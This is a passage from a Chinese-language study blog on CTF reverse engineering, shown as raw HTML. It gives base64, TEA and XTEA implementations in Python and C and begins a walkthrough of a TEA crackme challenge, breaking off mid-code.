class="hljs-string">&#x27;&#123;:0&gt;6&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(x))<br>    <span class="hljs-comment"># print(bin_str)</span><br>    <span class="hljs-comment"># 输出的字符串</span><br>    outputs = <span class="hljs-string">&quot;&quot;</span><br>    nums = inputs.count(<span class="hljs-string">&#x27;=&#x27;</span>)<br>    <span class="hljs-keyword">while</span> bin_str:<br>        temp_list = bin_str[:<span class="hljs-number">4</span>]<br>        temp_str = <span class="hljs-string">&quot;&quot;</span>.join(temp_list)<br>        <span class="hljs-comment"># print(temp_str)</span><br>        <span class="hljs-comment"># 补足8位字节</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">len</span>(temp_str) % <span class="hljs-number">8</span> != <span class="hljs-number">0</span>):<br>            temp_str = temp_str[<span class="hljs-number">0</span>:-<span class="hljs-number">1</span> * nums * <span class="hljs-number">2</span>]<br>        <span class="hljs-comment"># 将四个6字节的二进制转换为三个字符</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">int</span>(<span class="hljs-built_in">len</span>(temp_str) / <span class="hljs-number">8</span>)):<br>            outputs += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(temp_str[i * <span class="hljs-number">8</span>:(i + <span class="hljs-number">1</span>) * <span class="hljs-number">8</span>], <span class="hljs-number">2</span>))<br>        bin_str = bin_str[<span class="hljs-number">4</span>:]<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Decrypted String:\n%s &quot;</span> % outputs)<br><br><br><span class="hljs-built_in">print</span>()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;     *************************************&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;     *    (1)encode         (2)decode    *&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;     *************************************&quot;</span>)<br><span class="hljs-built_in">print</span>()<br><br>num = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;Please select the operation you want to perform:\n&quot;</span>)<br><span class="hljs-keyword">if</span> (num == <span class="hljs-string">&quot;1&quot;</span>):<br>    input_str = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;Please enter a string that needs to be encrypted: \n&quot;</span>)<br>    My_base64_encode(input_str)<br><span class="hljs-keyword">else</span>:<br>    input_str = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;Please enter a string that needs to be decrypted: \n&quot;</span>)<br>    My_base64_decode(input_str)<br></code></pre></td></tr></table></figure><h1 id="TEA算法"><a href="#TEA算法" class="headerlink" title="TEA算法"></a>TEA算法</h1><h1 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h1><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-comment">#include &lt;stdint.h&gt;</span><br><br>void encrypt (uint32_t* v, uint32_t* k) &#123;<br>    uint32_t <span class="hljs-built_in">v0</span>=v[<span class="hljs-number">0</span>], <span class="hljs-built_in">v1</span>=v[<span class="hljs-number">1</span>], sum=<span class="hljs-number">0</span>, i<span class="hljs-comment">;           /* set up */</span><br>    uint32_t delta=<span class="hljs-number">0x9e3779b9</span><span class="hljs-comment">;                     /* a key schedule constant */</span><br>    uint32_t <span class="hljs-built_in">k0</span>=k[<span class="hljs-number">0</span>], <span class="hljs-built_in">k1</span>=k[<span class="hljs-number">1</span>], k2=k[<span class="hljs-number">2</span>], k3=k[<span class="hljs-number">3</span>]<span class="hljs-comment">;   /* cache key */</span><br>    for (i=<span class="hljs-number">0</span><span class="hljs-comment">; i &lt; 32; i++) &#123;                       /* basic cycle start */</span><br>        sum += delta;<br>        <span class="hljs-built_in">v0</span> += ((<span class="hljs-built_in">v1</span>&lt;&lt;<span class="hljs-number">4</span>) + <span class="hljs-built_in">k0</span>) ^ (<span class="hljs-built_in">v1</span> + sum) ^ ((<span class="hljs-built_in">v1</span>&gt;&gt;<span class="hljs-number">5</span>) + <span class="hljs-built_in">k1</span>);<br>        <span class="hljs-built_in">v1</span> += ((<span class="hljs-built_in">v0</span>&lt;&lt;<span class="hljs-number">4</span>) + k2) ^ (<span class="hljs-built_in">v0</span> + sum) ^ ((<span class="hljs-built_in">v0</span>&gt;&gt;<span class="hljs-number">5</span>) + k3);  <br>    &#125;                                              <span class="hljs-comment">/* end cycle */</span><br>    v[<span class="hljs-number">0</span>]=<span class="hljs-built_in">v0</span><span class="hljs-comment">; v[1]=v1;</span><br>&#125;<br><br>void decrypt (uint32_t* v, uint32_t* k) &#123;<br>    uint32_t <span class="hljs-built_in">v0</span>=v[<span class="hljs-number">0</span>], <span class="hljs-built_in">v1</span>=v[<span class="hljs-number">1</span>], sum=<span class="hljs-number">0xC6EF3720</span>, i<span class="hljs-comment">;  /* set up */</span><br>    uint32_t delta=<span class="hljs-number">0x9e3779b9</span><span class="hljs-comment">;                     /* a key schedule constant */</span><br>    uint32_t <span class="hljs-built_in">k0</span>=k[<span class="hljs-number">0</span>], <span class="hljs-built_in">k1</span>=k[<span class="hljs-number">1</span>], k2=k[<span class="hljs-number">2</span>], k3=k[<span class="hljs-number">3</span>]<span class="hljs-comment">;   /* cache key */</span><br>    for (i=<span class="hljs-number">0</span><span class="hljs-comment">; i&lt;32; i++) &#123;                         /* basic cycle start */</span><br>        <span class="hljs-built_in">v1</span> -= ((<span class="hljs-built_in">v0</span>&lt;&lt;<span class="hljs-number">4</span>) + k2) ^ (<span class="hljs-built_in">v0</span> + sum) ^ ((<span class="hljs-built_in">v0</span>&gt;&gt;<span class="hljs-number">5</span>) + k3);<br>        <span class="hljs-built_in">v0</span> -= ((<span class="hljs-built_in">v1</span>&lt;&lt;<span class="hljs-number">4</span>) + <span class="hljs-built_in">k0</span>) ^ (<span class="hljs-built_in">v1</span> + sum) ^ ((<span class="hljs-built_in">v1</span>&gt;&gt;<span class="hljs-number">5</span>) + <span class="hljs-built_in">k1</span>);<br>        sum -= delta;                                   <br>    &#125;                                              <span class="hljs-comment">/* end cycle */</span><br>    v[<span class="hljs-number">0</span>]=<span class="hljs-built_in">v0</span><span class="hljs-comment">; v[1]=v1;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>在 Tea 算法中其最主要的识别特征就是 拥有一个 magic number ：0x9e3779b9 。当然，这 Tea 算法也有魔改的，感兴趣的可以看 2018 0ctf Quals milk-tea。</p><h1 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h1><p>解析 TEA 加密算法(C语言、python)：</p><p>TEA系列概述：</p><p>TEA算法是由剑桥大学计算机实验室的 David Wheeler 和 Roger Needham于1994年发明，TEA 是Tiny Encryption Algorithm的缩写，以加密解密速度快，实现简单著称。</p><p>TEA 算法每一次可以操作 64bit(8byte)，采用 128bit(16byte) 作为 key，算法采用迭代的形式，推荐的迭代轮数是 64轮，最少 32 轮。</p><p>为解决 TEA 算法密钥表攻击的问题，TEA 算法先后经历了几次改进，从 XTEA 到 BLOCK TEA，直至最新的XXTEA。</p><p>XTEA 也称做 TEAN：</p><p>它使用与 TEA 相同的简单运算，但四个子密钥采取不正规的方式进行混合以阻止密钥表攻击。</p><p>Block TEA 算法可以对 32 位的任意整数倍长度的变量块进行加解密的操作：</p><p>该算法将 XTEA 轮循函数依次应用于块中的每个字，并且将它附加于被应用字的邻字。</p><p>XXTEA使用跟Block TEA相似的结构：</p><p>但在处理块中每个字时利用了相邻字，且用拥有两个输入量的 MX 函数代替了 XTEA 轮循函数。</p><p>上面提到的相邻字其实就是数组中相邻的项。</p><p>TEA 系列算法中均使用了一个 DELTA 常数，但 DELTA 的值对算法并无什么影响，只是为了避免不良的取值，推荐DELTA 的值取为黄金分割数 (5√-2)&#x2F;2 与 232 的乘积，取整后的十六进制值为 0x9e3779B9，用于保证每一轮加密都不相同。</p><h2 id="TEA-加密："><a href="#TEA-加密：" class="headerlink" title="TEA 加密："></a>TEA 加密：</h2><p>TEA算法介绍：</p><p>TEA 采用与 DES 算法类似的 Feistel 结构，迭代的每次循环使用加法和移位操作，对明文和密钥进行扩散和混乱，实现明文的非线性变换。TEA 密钥长度和迭代次数都是 DES 的两倍，抗“试错法”攻击的强度不低于 DES 算法。算法以32bits 的字为运算单位，而不是耗费计算能力的逐位运算。算法没有采用 DES 那样的转换矩阵，它安全、高效、占用存储空间少，非常适合在嵌入式系统中应用, 据说 QQ 就是使用 16 轮迭代的 TEA 算法。</p><p>加密过程：(解密过程逆过来即可)</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1731483334148-b86d80a7-758e-4958-954e-c1f769b059cf.png"></p><h3 id="c脚本"><a href="#c脚本" class="headerlink" title="c脚本"></a>c脚本</h3><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-comment">#include &lt;stdio.h&gt;</span><br><span class="hljs-comment">#include &lt;stdint.h&gt;</span><br> <br>void encrypt (uint32_t *v,uint32_t *k )&#123;<br>    uint32_t <span class="hljs-built_in">v0</span>=v[<span class="hljs-number">0</span>],<span class="hljs-built_in">v1</span>=v[<span class="hljs-number">1</span>],sum=<span class="hljs-number">0</span>,i;<br>    uint32_t delta=<span class="hljs-number">0x9e3779b9</span>;<br>    uint32_t <span class="hljs-built_in">k0</span>=k[<span class="hljs-number">0</span>],<span class="hljs-built_in">k1</span>=k[<span class="hljs-number">1</span>],k2=k[<span class="hljs-number">2</span>],k3=k[<span class="hljs-number">3</span>];<br>    for(i=<span class="hljs-number">0</span><span class="hljs-comment">;i&lt;32;i++)&#123;</span><br>        sum+=delta;<br>        <span class="hljs-built_in">v0</span>+=((<span class="hljs-built_in">v1</span>&lt;&lt;<span class="hljs-number">4</span>)+<span class="hljs-built_in">k0</span>)^(<span class="hljs-built_in">v1</span>+sum)^((<span class="hljs-built_in">v1</span>&gt;&gt;<span class="hljs-number">5</span>)+<span class="hljs-built_in">k1</span>);<br>        <span class="hljs-built_in">v1</span>+=((<span class="hljs-built_in">v0</span>&lt;&lt;<span class="hljs-number">4</span>)+k2)^(<span class="hljs-built_in">v0</span>+sum)^((<span class="hljs-built_in">v0</span>&gt;&gt;<span class="hljs-number">5</span>)+k3);<br>    &#125; <br>    v[<span class="hljs-number">0</span>]=<span class="hljs-built_in">v0</span><span class="hljs-comment">;v[1]=v1;</span><br>&#125;<br>void decrypt (uint32_t *v,uint32_t *k)&#123;<br>    uint32_t <span class="hljs-built_in">v0</span>=v[<span class="hljs-number">0</span>],<span class="hljs-built_in">v1</span>=v[<span class="hljs-number">1</span>],sum=<span class="hljs-number">0xC6EF3720</span>,i<span class="hljs-comment">;  //这里的sum是0x9e3779b9*32后截取32位的结果，截取很重要。</span><br>    uint32_t delta=<span class="hljs-number">0x9e3779b9</span>;<br>    uint32_t <span class="hljs-built_in">k0</span>=k[<span class="hljs-number">0</span>],<span class="hljs-built_in">k1</span>=k[<span class="hljs-number">1</span>],k2=k[<span class="hljs-number">2</span>],k3=k[<span class="hljs-number">3</span>];<br>    for (i=<span class="hljs-number">0</span><span class="hljs-comment">;i&lt;32;i++)&#123;</span><br>        <span class="hljs-built_in">v1</span>-=((<span class="hljs-built_in">v0</span>&lt;&lt;<span class="hljs-number">4</span>)+k2)^(<span class="hljs-built_in">v0</span>+sum)^((<span class="hljs-built_in">v0</span>&gt;&gt;<span class="hljs-number">5</span>)+k3);<br>        <span class="hljs-built_in">v0</span>-=((<span class="hljs-built_in">v1</span>&lt;&lt;<span class="hljs-number">4</span>)+<span class="hljs-built_in">k0</span>)^(<span class="hljs-built_in">v1</span>+sum)^((<span class="hljs-built_in">v1</span>&gt;&gt;<span class="hljs-number">5</span>)+<span class="hljs-built_in">k1</span>);<br>        sum-=delta;<br>    &#125; <br>    v[<span class="hljs-number">0</span>]=<span class="hljs-built_in">v0</span><span class="hljs-comment">;v[1]=v1;</span><br>&#125;<br> <br>int main()<br>&#123;<br>    uint32_t v[<span class="hljs-number">2</span>]=&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>&#125;,k[<span class="hljs-number">4</span>]=&#123;<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>&#125;;<br>    printf(<span class="hljs-string">&quot;加密前的数据：%u %u\n&quot;</span>,v[<span class="hljs-number">0</span>],v[<span class="hljs-number">1</span>])<span class="hljs-comment">; //%u 以十进制形式输出无符号整数 </span><br>    encrypt(v,k);<br>    printf(<span class="hljs-string">&quot;加密后数据：%u %u\n&quot;</span>,v[<span class="hljs-number">0</span>],v[<span class="hljs-number">1</span>]);<br>    decrypt(v,k);<br>    printf(<span class="hljs-string">&quot;解密后数据：%u %u\n&quot;</span>,v[<span class="hljs-number">0</span>],v[<span class="hljs-number">1</span>]);<br>    return <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="python脚本"><a href="#python脚本" class="headerlink" title="python脚本"></a>python脚本</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> ctypes import *<br><br><br><span class="hljs-attribute">def</span> encrypt(v, k):<br>    <span class="hljs-attribute">v0</span> = c_uint32(v[<span class="hljs-number">0</span>])<br>    <span class="hljs-attribute">v1</span> = c_uint32(v[<span class="hljs-number">1</span>])<br>    <span class="hljs-attribute">sum1</span> = c_uint32(<span class="hljs-number">0</span>)<br>    <span class="hljs-attribute">delta</span> = <span class="hljs-number">0</span>x9e3779b9<br>    <span class="hljs-attribute">for</span> i in range(<span class="hljs-number">32</span>):<br>        <span class="hljs-attribute">sum1</span>.value += delta<br>        <span class="hljs-attribute">v0</span>.value += ((v1.value &lt;&lt; <span class="hljs-number">4</span>) + k[<span class="hljs-number">0</span>]) ^ (v1.value + sum1.value) ^ ((v1.value &gt;&gt; <span class="hljs-number">5</span>) + k[<span class="hljs-number">1</span>])<br>        <span class="hljs-attribute">v1</span>.value += ((v0.value &lt;&lt; <span class="hljs-number">4</span>) + k[<span class="hljs-number">2</span>]) ^ (v0.value + sum1.value) ^ ((v0.value &gt;&gt; <span class="hljs-number">5</span>) + k[<span class="hljs-number">3</span>])<br>    <span class="hljs-attribute">return</span> v0.value, v1.value<br><br><br><span class="hljs-attribute">def</span> decrypt(v, k):<br>    <span class="hljs-attribute">v0</span> = c_uint32(v[<span class="hljs-number">0</span>])<br>    <span class="hljs-attribute">v1</span> = c_uint32(v[<span class="hljs-number">1</span>])<br>    <span class="hljs-attribute">delta</span> = <span class="hljs-number">0</span>x9e3779b9<br>    <span class="hljs-attribute">sum1</span> = c_uint32(delta * <span class="hljs-number">32</span>)<br>    <span class="hljs-attribute">for</span> i in range(<span class="hljs-number">32</span>):<br>        <span class="hljs-attribute">v1</span>.value -= ((v0.value &lt;&lt; <span class="hljs-number">4</span>) + k[<span class="hljs-number">2</span>]) ^ (v0.value + sum1.value) ^ ((v0.value &gt;&gt; <span class="hljs-number">5</span>) + k[<span class="hljs-number">3</span>])<br>        <span class="hljs-attribute">v0</span>.value -= ((v1.value &lt;&lt; <span class="hljs-number">4</span>) + k[<span class="hljs-number">0</span>]) ^ (v1.value + sum1.value) ^ ((v1.value &gt;&gt; <span class="hljs-number">5</span>) + k[<span class="hljs-number">1</span>])<br>        <span class="hljs-attribute">sum1</span>.value -= delta<br>    <span class="hljs-attribute">return</span> v0.value, v1.value<br><br><br><span class="hljs-attribute">if</span> __name__ == &#x27;__main__&#x27;:<br>    <span class="hljs-attribute">a</span> =<span class="hljs-meta"> [1, 2]</span><br>    <span class="hljs-attribute">k</span> =<span class="hljs-meta"> [2, 2, 3, 4]</span><br>    <span class="hljs-attribute">print</span>(<span class="hljs-string">&quot;加密前数据:&quot;</span>, a)<br>    <span class="hljs-attribute">res</span> = encrypt(a, k)<br>    <span class="hljs-attribute">print</span>(<span class="hljs-string">&quot;加密后的数据:&quot;</span>, res)<br>    <span class="hljs-attribute">res</span> = decrypt(res, k)<br>    <span class="hljs-attribute">print</span>(<span class="hljs-string">&quot;解密后数据:&quot;</span>, res)<br></code></pre></td></tr></table></figure><p>原文链接：<a href="https://blog.csdn.net/xiao__1bai/article/details/123307059">https://blog.csdn.net/xiao__1bai&#x2F;article&#x2F;details&#x2F;123307059</a></p><h2 id="XTEA加密"><a href="#XTEA加密" class="headerlink" title="XTEA加密"></a>XTEA加密</h2><h3 id="首先我们还是先了解一下XTEA算法"><a href="#首先我们还是先了解一下XTEA算法" class="headerlink" title="首先我们还是先了解一下XTEA算法"></a>首先我们还是先了解一下XTEA算法</h3><p>跟TEA算法很类似，差别就是将r的变化结果和l变化结果进行了交替赋值，同时位移次数进行了一些变化，也掺杂了一些与操作</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/42988179/1741071893775-0ce51887-c1a4-444a-acf3-1fc22abe7c73.png"></p><p>这里是典型的XTEA加密和异或加密，但是根据给定的key和算法，计算出来的是一个假flag：<br>fakeflag_plz_Try_more_hard_to_find_the_true_flag  </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdint.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">encipher</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> num_rounds, <span class="hljs-type">uint32_t</span> v[<span class="hljs-number">2</span>], <span class="hljs-type">uint32_t</span> <span class="hljs-type">const</span> key[<span class="hljs-number">4</span>])</span></span>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i;<br><span class="hljs-type">uint32_t</span> v0=v[<span class="hljs-number">0</span>],v1=v[<span class="hljs-number">1</span>],sum=<span class="hljs-number">0</span>,delta=<span class="hljs-number">0x9E3779B9</span>;<br><span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;num_rounds;i++)&#123;<br>v0+=(((v1&lt;&lt;<span class="hljs-number">4</span>)^(v1&gt;&gt;<span class="hljs-number">5</span>))+v1)^(sum+key[sum&amp;<span class="hljs-number">3</span>]);<br>sum+=delta;<br>v1+=(((v0&lt;&lt;<span class="hljs-number">4</span>)^(v0&gt;&gt;<span class="hljs-number">5</span>))+v0)^(sum+key[(sum&gt;&gt;<span class="hljs-number">11</span>)&amp;<span class="hljs-number">3</span>]);<br>&#125;<br>v[<span class="hljs-number">0</span>]=v0;v[<span class="hljs-number">1</span>]=v1;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">decipher</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> num_rounds,<span class="hljs-type">uint32_t</span> v[<span class="hljs-number">2</span>],<span class="hljs-type">uint32_t</span> <span class="hljs-type">const</span> key[<span class="hljs-number">4</span>])</span></span>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i;<br><span class="hljs-type">uint32_t</span> v0=v[<span class="hljs-number">0</span>],v1=v[<span class="hljs-number">1</span>],delta=<span class="hljs-number">0x9E3779B9</span>,sum=delta*num_rounds;<br><span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;num_rounds;i++)&#123;<br>v1-=(((v0&lt;&lt;<span class="hljs-number">4</span>)^(v0&gt;&gt;<span class="hljs-number">5</span>))+v0)^(sum+key[(sum&gt;&gt;<span class="hljs-number">11</span>)&amp;<span class="hljs-number">3</span>]);<br>sum-=delta;<br>v0-=(((v1&lt;&lt;<span class="hljs-number">4</span>)^(v1&gt;&gt;<span class="hljs-number">5</span>))+v1)^(sum+key[sum&amp;<span class="hljs-number">3</span>]);<br>&#125; <br>v[<span class="hljs-number">0</span>]=v0;v[<span class="hljs-number">1</span>]=v1;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-type">uint32_t</span> v[<span class="hljs-number">2</span>]=&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>&#125;;<br><span class="hljs-type">uint32_t</span> <span class="hljs-type">const</span> k[<span class="hljs-number">4</span>]=&#123;<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>&#125;;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> r=<span class="hljs-number">32</span>;<span class="hljs-comment">//这里是加密轮数，自己设置 </span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;加密前原始数据：%u %u\n&quot;</span>,v[<span class="hljs-number">0</span>],v[<span class="hljs-number">1</span>]);<br><span class="hljs-built_in">encipher</span>(r,v,k);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;加密后原始数据：%u %u\n&quot;</span>,v[<span class="hljs-number">0</span>],v[<span class="hljs-number">1</span>]);<br><span class="hljs-built_in">decipher</span>(r,v,k);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;解密后原始数据：%u %u\n&quot;</span>,v[<span class="hljs-number">0</span>],v[<span class="hljs-number">1</span>]);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;  <br></code></pre></td></tr></table></figure><h1 id="TEA例题"><a href="#TEA例题" class="headerlink" title="TEA例题"></a>TEA例题</h1><h2 id="1、"><a href="#1、" class="headerlink" title="1、"></a>1、</h2><p>先查壳，放入64</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721463402576-04d877a3-3083-429d-8842-70924b64c583.png"></p><p>直接运行exe是个fakeflag哈哈哈哈哈</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721463517559-d0f3fb8b-b846-4d69-8057-2a0bf5d39813.png"></p><p>去string里面找关键语句，然后x快捷键去查看调用的函数</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721463784208-50523ef6-e788-4572-b8d2-33d6210bf472.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721463842200-a2f6e9f1-73c9-4883-be32-8e7f9480c713.png"></p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">for</span> ( j = <span class="hljs-number">0</span><span class="hljs-comment">; j &lt; 10; ++j )</span><br>    <span class="hljs-comment">// 输入函数，scanf</span><br>    sub_1400111FE(<span class="hljs-string">&quot;%x&quot;</span>, &amp;<span class="hljs-built_in">v8</span>[j])<span class="hljs-comment">;</span><br>  <span class="hljs-comment">// v7重新赋值</span><br>  sub_140011339(<span class="hljs-built_in">v7</span>)<span class="hljs-comment">;</span><br>  <span class="hljs-comment">// v8备份到v9</span><br>  sub_140011145(<span class="hljs-built_in">v8</span>, v9)<span class="hljs-comment">;</span><br>  <span class="hljs-comment">// v7为key，v8为输入的值，进行tea加密</span><br>  sub_1400112B7(<span class="hljs-built_in">v8</span>, <span class="hljs-built_in">v7</span>)<span class="hljs-comment">;</span><br>  <span class="hljs-comment">// 验证加密的结果是否符合预期</span><br>  <span class="hljs-built_in">v6</span> = sub_140011352(<span class="hljs-built_in">v8</span>)<span class="hljs-comment">;</span><br>  <span class="hljs-meta">if</span> ( <span class="hljs-built_in">v6</span> )<br>  &#123;<br>    <span class="hljs-comment">// sub_140011195 为打印函数</span><br>    printf(<span class="hljs-string">&quot;you are right\n&quot;</span>)<span class="hljs-comment">;</span><br>    for ( k = <span class="hljs-number">0</span><span class="hljs-comment">; k &lt; 10; ++k )</span><br>    &#123;<br>      for ( m = <span class="hljs-number">3</span><span class="hljs-comment">; m &gt;= 0; --m )</span><br>        printf(<span class="hljs-string">&quot;%c&quot;</span>, (v9[k] &gt;&gt; (<span class="hljs-number">8</span> * m)))<span class="hljs-comment">;</span><br>    &#125;<br>  &#125;<br>  <span class="hljs-meta">else</span><br>  &#123;<br>    printf(<span class="hljs-string">&quot;fault!\nYou can go online and learn the tea algorithm!&quot;</span>)<span class="hljs-comment">;</span><br>  &#125;<br></code></pre></td></tr></table></figure><p>跟进 sub_140011339(v7)，发现v7被重新赋值</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721464236278-d2535e23-d7c9-402b-a19a-86b3f115c12f.png"></p><p>原来的———————————————————&gt;改后的</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs abnf">v7[<span class="hljs-number">0</span>] <span class="hljs-operator">=</span> <span class="hljs-number">1234</span><span class="hljs-comment">;</span><br>v7[<span class="hljs-number">1</span>] <span class="hljs-operator">=</span> <span class="hljs-number">5678</span><span class="hljs-comment">;</span><br>v7[<span class="hljs-number">2</span>] <span class="hljs-operator">=</span> <span class="hljs-number">9012</span><span class="hljs-comment">;</span><br>v7[<span class="hljs-number">3</span>] <span class="hljs-operator">=</span> <span class="hljs-number">3456</span><span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">v6</span> <span class="hljs-operator">=</span> <span class="hljs-number">2233</span><span class="hljs-comment">;</span><br><span class="hljs-attribute">v7</span> <span class="hljs-operator">=</span> <span class="hljs-number">4455</span><span class="hljs-comment">;</span><br><span class="hljs-attribute">v8</span> <span class="hljs-operator">=</span> <span class="hljs-number">6677</span><span class="hljs-comment">;</span><br><span class="hljs-attribute">v9</span> <span class="hljs-operator">=</span> <span class="hljs-number">8899</span><span class="hljs-comment">;</span><br>*a1 <span class="hljs-operator">=</span> <span class="hljs-number">2233</span><span class="hljs-comment">;</span><br>a1[<span class="hljs-number">1</span>] <span class="hljs-operator">=</span> v7<span class="hljs-comment">;</span><br>a1[<span class="hljs-number">2</span>] <span class="hljs-operator">=</span> v8<span class="hljs-comment">;</span><br>a1[<span class="hljs-number">3</span>] 